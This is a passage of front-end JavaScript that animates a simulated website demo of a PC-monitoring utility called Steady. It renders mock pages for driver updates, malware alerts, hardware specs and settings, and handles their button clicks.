    mount: function () { renderDrivers(); },
    update: function () {}
  };
  function renderDrivers() {
    var stat = $('[data-k="dstat"]'), rows = $('[data-k="drows"]');
    if (!stat) return;
    var upd = drivers.filter(function (d) { return d.st === "upd"; }).length, busy = drivers.some(function (d) { return d.st === "busy"; });
    var o = S.drvChecking ? ["Checking for driver updates…", "Asking NVIDIA and Windows Update about your components.", "var(--s-info)", "rgba(91,157,255,.13)", "sync", true] :
      upd ? [upd === 1 ? "1 update available" : upd + " updates available", "Click Update next to it. Windows or the maker's installer will ask for permission, and a restart may be needed.", "var(--s-warn)", "rgba(245,165,36,.13)", "down"] :
      busy ? ["Installing an update…", "Steady checked NVIDIA's signature and opened the installer.", "var(--s-info)", "rgba(91,157,255,.13)", "sync", true] :
      ["Your drivers look current", "Everything Steady can check automatically is on the newest version. Parts marked “Check maker” (chipset, BIOS) can only be checked on the maker's website.", "var(--s-ok)", "rgba(61,214,140,.13)", "check"];
    stat.innerHTML = '<div class="sim-orb' + (o[5] ? " spin" : "") + '" style="--c:' + o[2] + ";--bg:" + o[3] + '">' + ic(o[4]) + "</div><div><h4>" + o[0] + "</h4><p>" + o[1] + "</p><small>" + (S.drvChecking ? "&nbsp;" : "Checked NVIDIA and Windows Update at " + clock(drivers[0].checked)) + "</small></div>";
    rows.innerHTML = drivers.map(function (d) {
      var st = STATUS[d.st], acts = "";
      if (d.st === "upd") acts = '<button type="button" class="sim-link" data-act="demo" data-msg="Opens NVIDIA\'s release notes for 617.42.">What\'s new</button><button type="button" class="sim-btn small primary" data-act="drvupd" data-id="' + d.id + '">Update</button>';
      else if (d.st === "done" || d.st === "ok") acts = d.id === "gpu" ? '<button type="button" class="sim-link" data-act="demo" data-msg="Opens NVIDIA\'s release notes for 617.42.">Release notes</button>' : "";
      else if (d.act) acts = '<button type="button" class="sim-btn small" data-act="demo" data-msg="Opens the maker\'s support page for your hardware.">' + esc(d.act) + "</button>";
      var prog = d.st === "busy" ? '<div class="sim-prog"><div class="sim-bar" style="--c:var(--s-accent)"><i style="width:' + d.p + '%"></i></div><small>' + esc(d.pt) + "</small></div>" : "";
      return '<div class="sim-drv-row"><div class="sim-drv-r"><div class="sim-drv-c"><span class="ic">' + ic(d.ic) + "</span><div><b>" + esc(d.name) + "</b><small>" + esc(d.cat + "  ·  " + d.maker) + "</small></div></div>" +
        "<div><b>" + esc(d.have) + "</b><small>" + esc(d.haveSub) + "</small></div><div><b" + (d.st === "upd" ? ' class="new"' : "") + ">" + esc(d.latest) + "</b><small>" + esc(d.latestSub) + "</small></div>" +
        '<div><span class="sim-pill" style="color:' + st[1] + ";background:" + st[2] + '">' + st[0] + '</span></div><div class="sim-drv-a">' + acts + "</div></div>" + prog +
        (d.note && d.st !== "busy" ? '<div class="sim-drv-n">' + esc(d.note) + "</div>" : "") + "</div>";
    }).join("");
  }
  function installGpu(d) {
    d.st = "busy"; d.p = 0; d.pt = "Downloading Game Ready Driver 617.42 — 0%";
    var t0 = Date.now(), total = reduce ? 600 : 4200;
    (function t() {
      var f = Math.min(1, (Date.now() - t0) / total);
      if (f < .62) { d.p = f / .62 * 100; d.pt = "Downloading Game Ready Driver 617.42 — " + Math.round(d.p) + "%  ·  " + Math.round(873 * d.p / 100) + " of 873 MB"; }
      else if (f < .75) { d.p = 100; d.pt = "Checking NVIDIA's digital signature…"; }
      else { d.p = 100; d.pt = "Signature verified. Opening NVIDIA's installer…"; }
      if (f >= 1) {
        d.st = "done"; d.have = "617.42"; d.haveSub = "Oct 6, 2026  ·  32.0.16.1742"; d.latestSub = "NVIDIA  ·  Oct 6, 2026"; d.note = "Installed. Your NVIDIA audio driver was updated with it.";
        drivers.forEach(function (x) { if (x.id === "hda") { x.st = "ok"; x.have = "1.4.5.0"; x.haveSub = "Oct 6, 2026"; } });
        toast("NVIDIA driver updated", "617.42 is installed. A restart isn't needed for this one.", "var(--s-ok)");
      }
      if (S.page === "drivers") renderDrivers();
      if (f < 1) later(t, 120);
    })();
  }

  // ----- Alerts -----
  PAGES.alerts = {
    html: function () {
      return head("Alerts", "Steady watches for programs that act like malware, crypto-miners or remote-control scams.", '<button type="button" class="sim-btn" data-act="demo" data-msg="Opens Windows Security.">' + ic("shield") + 'Open Windows Security</button><button type="button" class="sim-btn primary" data-act="alcheck">' + ic("sync") + "Check again</button>") +
        '<div class="sim-card sim-status" data-k="astat"></div><div data-k="alist"></div>';
    },
    mount: function () { renderAlerts(); },
    update: function () {}
  };
  function renderAlerts() {
    var stat = $('[data-k="astat"]'), list = $('[data-k="alist"]');
    if (!stat) return;
    var live = alerts.filter(function (a) { return !a.done && S.trusted.indexOf(a.id) < 0; }), imp = live.filter(function (a) { return a.sev === "high"; }), low = live.filter(function (a) { return a.sev !== "high"; });
    var o = S.alChecking ? ["Checking…", "Looking at every running program and startup entry.", "var(--s-info)", "rgba(91,157,255,.13)", "sync", true] :
      imp.length ? [imp.length === 1 ? "1 thing worth a look" : imp.length + " things worth a look", "Something looks risky. Read what was found, then end it or scan it with Microsoft Defender if you don't recognize it.", "var(--s-danger)", "rgba(242,92,92,.13)", "warn"] :
      ["All clear", "Nothing suspicious is running right now." + (low.length ? " There " + (low.length === 1 ? "is 1 small note" : "are " + low.length + " small notes") + " below, just so you know." : ""), "var(--s-ok)", "rgba(61,214,140,.13)", "check"];
    stat.innerHTML = '<div class="sim-orb' + (o[5] ? " spin" : "") + '" style="--c:' + o[2] + ";--bg:" + o[3] + '">' + ic(o[4]) + "</div><div><h4>" + o[0] + "</h4><p>" + o[1] + "</p><small>Checked 286 running processes and 14 startup items  ·  updated " + clock(new Date()) + "</small></div>";
    function one(a) {
      var high = a.sev === "high", c = high ? "var(--s-danger)" : "var(--s-info)", bg = high ? "rgba(242,92,92,.13)" : "rgba(91,157,255,.13)";
      return '<div class="sim-card sim-al' + (a.open ? " open" : "") + '" style="--c:' + c + ";--bg:" + bg + '"><div class="sim-al-h"><div class="sim-orb">' + ic(high ? "warn" : "info") + "</div><div><h5>" + esc(a.title) + "</h5><p>" + esc(a.body) + '</p></div><span class="sim-pill" style="color:' + c + ";background:" + bg + '">' + (high ? "High risk" : "FYI") + '</span><button type="button" class="chev" data-act="alopen" data-id="' + a.id + '" aria-label="' + (a.open ? "Collapse" : "Expand") + '" aria-expanded="' + !!a.open + '">' + ic("chev") + "</button></div>" +
        '<div class="sim-al-b"><div class="sim-al-m"><b>' + esc(a.who) + "</b>" + (a.pid ? "  ·  PID " + a.pid + "  ·  " + (a.ended ? "Ended" : "Running now") : "  ·  Starts automatically when you sign in") + "  ·  Found " + ago(a.found) + "<small>" + esc(a.path) + "</small>" + (a.pub ? "<small>" + esc(a.pub) + "</small>" : "") + "</div>" +
        (a.code ? '<div class="sim-code">' + esc(a.code) + "</div>" : "") +
        (a.result ? '<div class="sim-al-r">' + esc(a.result) + "</div>" : "") +
        '<div class="sim-al-a">' + (a.pid && !a.ended ? '<button type="button" class="sim-btn small danger" data-act="alend" data-id="' + a.id + '">End process</button>' : "") +
        (a.scan && !a.result ? '<button type="button" class="sim-btn small" data-act="alscan" data-id="' + a.id + '"' + (a.scanning ? " disabled" : "") + ">" + ic("shield") + (a.scanning ? "Scanning…" : "Scan with Defender") + "</button>" : "") +
        (a.startup ? '<button type="button" class="sim-btn small" data-act="demo" data-msg="Opens Settings › Apps › Startup, where you can turn it off.">Startup apps</button>' : '<button type="button" class="sim-btn small" data-act="demo" data-msg="Opens the folder in File Explorer, with the file selected.">' + ic("folder") + "Open location</button>") +
        '<button type="button" class="sim-btn small" data-act="demo" data-msg="Searches the web for “' + esc(a.who.split("  ")[0]) + ' is it safe”.">' + ic("search") + "Search online</button>" +
        '<button type="button" class="sim-ghost" data-act="alhide" data-id="' + a.id + '">Hide for now</button><button type="button" class="sim-ghost" data-act="altrust" data-id="' + a.id + '">I trust this</button></div></div></div>';
    }
    list.innerHTML = (imp.length ? '<div class="sim-cap">Needs a look</div>' + imp.map(one).join("") : "") + (low.length ? '<div class="sim-cap">Just so you know</div>' + low.map(one).join("") : "");
    updFrame();
  }
  function alertById(id) { return alerts.filter(function (a) { return a.id === id; })[0]; }

  // ----- My PC -----
  PAGES.mypc = {
    html: function () {
      return head("My PC", CPU_MODEL + "  ·  " + GPU_MODEL + "  ·  32.0 GB RAM  ·  Windows 11 Home", '<button type="button" class="sim-btn" data-act="specrefresh">' + ic("sync") + 'Refresh</button><button type="button" class="sim-btn primary" data-act="copyspecs">' + ic("copy") + "Copy all specs</button>") +
        '<div class="sim-specs" data-k="specs"></div>';
    },
    mount: function () { renderSpecs(S.specLoading); },
    update: function () {}
  };
  function renderSpecs(loading) {
    var box = $('[data-k="specs"]');
    if (!box) return;
    var all = specs(), u = { c: used(drives.C), d: used(drives.D) };
    function sec(s) {
      var rows = s.rows.map(function (r) {
        if (r[0] === "#") return '<div class="hd">' + r[1] + "</div>";
        if (r[0].indexOf("bar:") === 0) { var d = r[1] === "c" ? drives.C : drives.D, du = u[r[1]]; return "<dt>" + r[0].slice(4) + "</dt><dd>" + gb(d.total - du) + " free of " + gb(d.total) + '<div class="sim-bar" style="--c:var(--s-accent)"><i style="width:' + (du / d.total * 100).toFixed(1) + '%"></i></div></dd>'; }
        return "<dt>" + esc(r[0]) + "</dt><dd>" + (loading ? '<div class="sim-skel" style="width:' + (40 + (r[1].length * 7) % 50) + '%"></div>' : esc(r[1])) + "</dd>";
      }).join("");
      return '<div class="sim-card sim-spec"><div class="sim-spec-h"><span class="ic">' + ic(s.ic) + "</span><div><b>" + s.t + "</b><small>" + esc(s.s) + "</small></div></div><dl>" + rows + "</dl></div>";
    }
    box.innerHTML = '<div class="col">' + all.filter(function (s) { return !s.right; }).map(sec).join("") + '</div><div class="col">' + all.filter(function (s) { return s.right; }).map(sec).join("") + "</div>";
  }
  function specText() {
    return specs().map(function (s) {
      return s.t + "\n" + s.rows.filter(function (r) { return r[0] !== "#" && r[0].indexOf("bar:") !== 0; }).map(function (r) { return "  " + r[0] + ": " + r[1]; }).join("\n");
    }).join("\n\n") + "\n\n(Made-up specs from the Steady website demo.)";
  }

  // ----- Settings -----
  PAGES.settings = {
    html: function () {
      function seg(act, opts, v) { return '<div class="sim-seg" role="group">' + opts.map(function (o) { return '<button type="button" data-act="' + act + '" data-v="' + o[0] + '" aria-pressed="' + (String(v) === String(o[0])) + '">' + o[1] + "</button>"; }).join("") + "</div>"; }
      function tog(act, v) { return '<button type="button" class="sim-sw" data-act="' + act + '" aria-pressed="' + v + '" aria-label="Toggle"></button>'; }
      function row(t, p, ctl) { return '<div class="sim-setrow"><div><b>' + t + "</b><p>" + p + "</p></div>" + ctl + "</div>"; }
      return head("Settings", "Make Steady work the way you like.") +
        '<div class="sim-cap">Program list</div><div class="sim-card sim-setcard">' +
        row("Update speed", "How often the numbers refresh. Light uses the least power.", seg("speed", [[1, "Fast · 1s"], [2, "Normal · 2s"], [4, "Light · 4s"]], S.speed)) +
        row("Let rows change places", "How often the list may re-sort. Rows never move while your mouse is over the list, and only swap when one is clearly ahead.", seg("reorder", [[3, "3s"], [5, "5s"], [10, "10s"], [0, "Only when I ask"]], S.reorder)) +
        row("Hide idle background programs", "Only show background programs using noticeable CPU, GPU, disk, or more than 100 MB of memory. Apps with open windows always show.", tog("hideidle", S.hideIdle)) +
        row("Include Windows helper programs", "Advanced. Also lists closable programs that live in the Windows folder. Core system processes are always hidden.", tog("helpers", S.helpers)) + "</div>" +
        '<div class="sim-cap">Alerts</div><div class="sim-card sim-setcard">' +
        row("Pop up a notice for new alerts", "Shows a small notice and flashes the taskbar button when something suspicious starts.", tog("popups", S.popups)) +
        row("Trusted items", "Things you marked “I trust this” are never flagged. Reset to see every alert again.", '<button type="button" class="sim-btn" data-act="resettrust">Reset trusted items</button>') + "</div>" +
        '<div class="sim-cap">Taskbar widget and updates</div><div class="sim-card sim-setcard">' +
        row("Show the taskbar widget", "Little liquid orbs next to the clock fill up as your PC gets busier.", tog("widget", S.widget)) +
        row("Install updates automatically", "Steady checks GitHub when it starts, verifies the download's SHA-256, and installs it. Turn off to use the blue update button instead.", tog("autoupd", S.autoUpd)) + "</div>";
    },
    update: function () {}
  };

  // ---------- input ----------
  root.addEventListener("click", function (e) {
    var t = e.target.closest ? e.target.closest("[data-go],[data-act],[data-sort]") : null;
    if (!t || !root.contains(t)) return;
    if (t.hasAttribute("data-go")) { go(t.getAttribute("data-go")); return; }
    if (t.hasAttribute("data-sort")) { S.sort = t.getAttribute("data-sort"); S.sinceSort = 0; syncRows(false); order(true); return; }
    var act = t.getAttribute("data-act"), row = t.closest(".sim-row"), a = row ? byId(row.getAttribute("data-id")) : null;
    switch (act) {
      case "toggle": if (a && !a.closing) openRow(a, row, !S.open[a.id]); break;
      case "end": if (a && !a.closing) endApp(a, row, t, false); break;
      case "endtree": if (a && !a.closing) endApp(a, row, row.querySelector(".sim-end"), true); break;
      case "copypath": copy(t.getAttribute("data-path"), "Path copied", "Paste it anywhere."); break;
      case "hideidle": S.hideIdle = !S.hideIdle; t.setAttribute("aria-pressed", S.hideIdle); syncRows(false); break;
      case "showidle": S.hideIdle = false; var hb = $('[data-act="hideidle"]'); if (hb) hb.setAttribute("aria-pressed", "false"); syncRows(false); break;
      case "sortnow": S.sinceSort = 0; order(true); break;
      case "freeze": S.frozen = !S.frozen; t.setAttribute("aria-pressed", S.frozen); t.innerHTML = ic(S.frozen ? "play" : "pause") + "<span>" + (S.frozen ? "Resume" : "Freeze order") + "</span>"; statusText(); break;
      case "demo": toast("In the real app", t.getAttribute("data-msg")); break;
      case "update":
        if (t.classList.contains("busy")) break;
        t.classList.add("busy");
        later(function () { t.classList.remove("busy"); toast("Steady 1.2.1 is up to date", "Steady checks GitHub every time it starts, and the update button turns blue when there's something new."); }, reduce ? 200 : 1300);
        break;
      // storage
      case "drive": S.drive = t.getAttribute("data-d"); S.view = "folders"; renderDrives(); if (!S.scanned[S.drive]) scan(S.drive); else renderList(); break;
      case "rescan": S.scanned[S.drive] = false; drive().path = []; scan(S.drive); break;
      case "perm": S.perm = !S.perm; t.setAttribute("aria-pressed", S.perm); break;
      case "view": S.view = t.getAttribute("data-v"); renderList(); break;
      case "open": drive().path.push(t.getAttribute("data-n")); renderList(); break;
      case "up": drive().path.pop(); renderList(); break;
      case "crumb": drive().path = drive().path.slice(0, +t.getAttribute("data-i")); renderList(); break;
      case "showdl": S.drive = "C"; S.view = "folders"; drives.C.path = ["Users", "you", "Downloads"]; renderDrives(); if (!S.scanned.C) scan("C"); else renderList(); break;
      case "del":
        var n = nodeById(t.getAttribute("data-id"));
        if (!n) break;
        confirmBtn(t, "Confirm", function () {
          var it = t.closest(".sim-item"); it.classList.add("gone"); t.disabled = true; t.textContent = S.perm ? "Deleting\u2026" : "Moving\u2026";
          later(function () {
            var s0 = size(n);
            n.gone = true;
            if (S.perm) toast("Deleted " + n.n, gb(s0) + " freed on " + S.drive + ":", "var(--s-ok)");
            else { drive().held += s0; S.binItems += n.kids ? 40 : 1; toast("Moved to the Recycle Bin", n.n + "  \u00b7  " + gb(s0) + ". Empty the Recycle Bin to free the space.", "var(--s-ok)"); }
            renderDrives(); renderList();
          }, 500);
        });
        break;
      case "emptybin":
        confirmBtn(t, "Confirm", function () { var freed = bin(); drives.C.held = drives.D.held = 0; S.binItems = 0; renderDrives(); toast("Recycle Bin emptied", gb(freed) + " freed.", "var(--s-ok)"); });
        break;
      case "cleantemp":
        var tn = tempNode();
        if (!tn || tn.s < .2) break;
        confirmBtn(t, "Confirm", function () { var freed = tn.s - .08; tn.s = .08; renderDrives(); if (S.scanned[S.drive]) renderList(); toast("Cleaned up temporary files", gb(freed) + " freed. Files in use were left alone.", "var(--s-ok)"); });
        break;
      case "uninstall":
        var gname = t.getAttribute("data-n");
        confirmBtn(t, "Confirm", function () {
          (function mark(x) { (x.kids || []).forEach(function (k) { if (k.k === "game" && k.game === gname) k.gone = true; else mark(k); }); })(drive().root);
          var dp = drive().path; if (dp.indexOf(gname) > -1) drive().path = dp.slice(0, dp.indexOf(gname));
          renderDrives(); renderList(); toast("Steady asked Steam to uninstall " + gname, "Steam removes the whole game, so your library stays correct.", "var(--s-ok)");
        });
        break;
      // drivers
      case "drvupd": var dv = drivers.filter(function (x) { return x.id === t.getAttribute("data-id"); })[0]; if (dv && dv.st === "upd") installGpu(dv); renderDrivers(); break;
      case "drvcheck": if (S.drvChecking) break; S.drvChecking = true; renderDrivers(); later(function () { S.drvChecking = false; drivers.forEach(function (x) { x.checked = new Date(); }); renderDrivers(); }, reduce ? 200 : 1500); break;
      // alerts
      case "alopen": var al = alertById(t.getAttribute("data-id")); al.open = !al.open; renderAlerts(); break;
      case "alend": var ae = alertById(t.getAttribute("data-id")); ae.ended = true; ae.done = ae.sev === "high"; renderAlerts(); toast("Ended " + ae.who, "It's no longer running.", "var(--s-ok)"); break;
      case "alscan":
        var as = alertById(t.getAttribute("data-id")); as.scanning = true; renderAlerts();
        later(function () {
          as.scanning = false;
          as.result = as.threat ? "Microsoft Defender found Trojan:Win32/Wacatac and quarantined it." : "Microsoft Defender found nothing. It's probably fine.";
          renderAlerts();
          if (as.threat) later(function () { as.done = true; as.ended = true; renderAlerts(); toast("Threat removed", "Defender quarantined updater-helper.exe.", "var(--s-ok)"); }, 1600);
        }, reduce ? 300 : 2200);
        break;
      case "alhide": var ah = alertById(t.getAttribute("data-id")); ah.done = true; renderAlerts(); toast("Hidden for now", "It'll come back next time Steady checks."); break;
      case "altrust": S.trusted.push(t.getAttribute("data-id")); renderAlerts(); toast("Won't warn about this again", "You can reset trusted items in Settings."); break;
      case "alcheck": if (S.alChecking) break; S.alChecking = true; renderAlerts(); later(function () { S.alChecking = false; alerts.forEach(function (x) { if (x.done && !x.ended) x.done = false; }); renderAlerts(); }, reduce ? 200 : 1300); break;
      // my pc
      case "copyspecs": copy(specText(), "Specs copied", "Paste them anywhere — a forum post, a support chat, a spreadsheet."); break;
      case "specrefresh": S.specLoading = true; renderSpecs(true); later(function () { S.specLoading = false; if (S.page === "mypc") renderSpecs(false); }, reduce ? 150 : 900); break;
      // settings
      case "speed": S.speed = +t.getAttribute("data-v"); pressSeg(t); break;
      case "reorder": S.reorder = +t.getAttribute("data-v"); pressSeg(t); break;
      case "helpers": S.helpers = !S.helpers; t.setAttribute("aria-pressed", S.helpers); break;
      case "popups": S.popups = !S.popups; t.setAttribute("aria-pressed", S.popups); break;
      case "widget": S.widget = !S.widget; t.setAttribute("aria-pressed", S.widget); if (S.widget) toast("Taskbar widget on", "On a real PC, three small orbs sit next to the clock."); break;
      case "autoupd": S.autoUpd = !S.autoUpd; t.setAttribute("aria-pressed", S.autoUpd); break;
      case "resettrust": S.trusted = []; toast("Trusted items reset", "Every alert will show again."); break;
    }
    if (act === "hideidle" && S.page === "settings") t.setAttribute("aria-pressed", S.hideIdle);
  });
  root.addEventListener("keydown", function (e) {
    if ((e.key === "Enter" || e.key === " ") && e.target.matches && e.target.matches('[role="button"][data-act]')) { e.preventDefault(); e.target.click(); }
  });
  function pressSeg(t) { $$("button", t.parentNode).forEach(function (b) { b.setAttribute("aria-pressed", b === t); }); }
  function copy(text, title, body) {
    var done = function () { toast(title, body, "var(--s-ok)"); };
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, function () { toast("Couldn't copy", "Your browser blocked the clipboard."); });
    else toast("Couldn't copy", "Your browser blocked the clipboard.");
  }

  // ---------- size: the app's own layout, scaled to fit; reflowed on narrow screens ----------
  var win;
  function fit() {
    var w = root.clientWidth;
    if (!w) return;
    var compact = w < 720;
    root.classList.toggle("compact", compact);
    if (compact) { win.style.transform = ""; root.style.height = ""; }
    else { var k = Math.min(1.1, w / W); win.style.transform = "scale(" + k + ")"; root.style.height = Math.round(H * k) + "px"; }
  }

  // ---------- run ----------
  var visible = false, last = 0, acc = 0;
  function loop(now) {
    requestAnimationFrame(loop);
    var dt = last ? Math.min(1, (now - last) / 1000) : 0;
    last = now;
    if (!visible || document.hidden) return;
    acc += dt;
    if (acc < S.speed) return;
    step(acc); acc = 0;
    updFrame();
    PAGES[S.page].update();
  }
  function start() {
    reset();
    frame();
    win = $(".sim-win");
    go("programs");
    updFrame();
    fit();
  }
  start();
  if (window.ResizeObserver) new ResizeObserver(fit).observe(root); else window.addEventListener("resize", fit);
  if (window.IntersectionObserver) new IntersectionObserver(function (es) { visible = es[0].isIntersecting; }, { rootMargin: "100px" }).observe(root); else visible = true;
  requestAnimationFrame(loop);
  var resetBtn = document.getElementById("simReset");
  if (resetBtn) resetBtn.addEventListener("click", function () { start(); });
})();
